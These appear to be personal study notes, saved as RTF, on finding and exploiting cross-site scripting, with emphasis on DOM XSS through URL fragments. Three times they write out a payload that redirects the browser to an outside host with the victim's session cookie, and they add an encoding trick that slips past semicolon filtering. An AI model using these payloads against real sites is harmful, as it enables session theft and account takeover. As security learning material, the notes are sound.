{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fnil\fcharset0 Menlo-Bold;\f2\fnil\fcharset0 Menlo-Regular;
\f3\fnil\fcharset0 HelveticaNeue;\f4\fmodern\fcharset0 Courier;}
{\colortbl;\red255\green255\blue255;\red52\green52\blue52;\red0\green0\blue0;\red43\green138\blue83;
}
\paperw11900\paperh16840\margl1440\margr1440\vieww23520\viewh12500\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0\fs32 \cf0 We have many different types of XSS\
	1. Stored XSS\
	2. Reflected XSS\
	3. DOM XSS\
\
\pard\pardeftab720\partightenfactor0
\cf0 \expnd0\expndtw0\kerning0
To find XSS flaws we need to know where to look for it and how we can detect it. \
Where to look for it is as simple as complicated: \
	
\b all we need is to probe every input the application has.
\b0 \kerning1\expnd0\expndtw0 \
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\b \cf0 \ul \ulc0 PROCESS
\b0 \ulnone \
\pard\pardeftab720\partightenfactor0

\fs40 \cf2 \expnd0\expndtw0\kerning0
\

\fs32 We will do it using a URI Fragment  \'97> \'91#\'92   \'97> The part of a URL after a \'91#\'92 character\
\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 \kerning1\expnd0\expndtw0 Example\
\
\pard\pardeftab720\partightenfactor0

\b \cf2 \expnd0\expndtw0\kerning0
Probe
\b0  \'97> http://domain/page#1\
\
We can quickly move to a full working payload like:\
\

\b Injection
\b0  \'97> http://domain/page#
\f1\b \cf0 <script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>
\f0\b0 \cf2 \

\b Source code
\b0  \'97> <input type=\'93text\'94 value=\'93
\f1\b \cf0 <script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>
\f0\b0 \cf2 \'94>
\fs40 \
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\fs32 \cf0 \kerning1\expnd0\expndtw0 \

\b \ul DETECTION
\b0 \ulnone \
\
\pard\pardeftab720\partightenfactor0
\cf0 \expnd0\expndtw0\kerning0
Detection is harder because I can\'92t use a tool like Burp Suite to view the modified responses (as it\'92s all handled client site by the browser). \
However by\'a0using tools like firebox, by using the developer console, or by statically analysing the JavaScript we can still pick up on these issues simply.\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 \kerning1\expnd0\expndtw0 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\b \ul DOM XSS\
\

\b0 \ulnone We have a web site that load different images \'97> www.chinterest.com#1,  www.chinterest.com#2, www.chinterest.com#3, www.chinterest.com#4\
we are able to exploit it by:
\b \ul \
\
\pard\pardeftab720\partightenfactor0

\f2\b0 \cf0 \expnd0\expndtw0\kerning0
\ulnone www.chinterest.com#
\f1\b <script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>
\f3\b0 \

\fs22 \
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0\b\fs32 \cf0 \kerning1\expnd0\expndtw0 \ul \

\b0 \ulnone \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
READ : https://www.gracefulsecurity.com/an-introduction-to-dom-xss/\
\
\pard\pardeftab720\partightenfactor0

\f4 \cf3 \expnd0\expndtw0\kerning0
http://site.com/example?#input=token<script>alert(1)</script>;\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0 \cf0 \kerning1\expnd0\expndtw0 \
\pard\pardeftab720\partightenfactor0
\cf0 \expnd0\expndtw0\kerning0
A simple XSS proof-of-concept, here however you might thing that a more complex payload would not be possible as the application stops reading when it spots a semi-colon and so something as simple as alert(1);alert(2) would not be possible, \
however thanks to the use of unescape() on the returned data I can use a payload like this: \
\pard\pardeftab720\partightenfactor0
\cf0 \kerning1\expnd0\expndtw0 \
\pard\pardeftab720\partightenfactor0

\f4 \cf0 \expnd0\expndtw0\kerning0
http://gracefulsecurity.com/example?#input=token<script>alert(1)%3balert(2)</script>;\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0 \cf0 \kerning1\expnd0\expndtw0 \
\pard\pardeftab720\partightenfactor0
\cf0 \expnd0\expndtw0\kerning0
; is %3b \'97 in URI Encoding\kerning1\expnd0\expndtw0 \
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
\
\
\
\
\
\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
\
\
}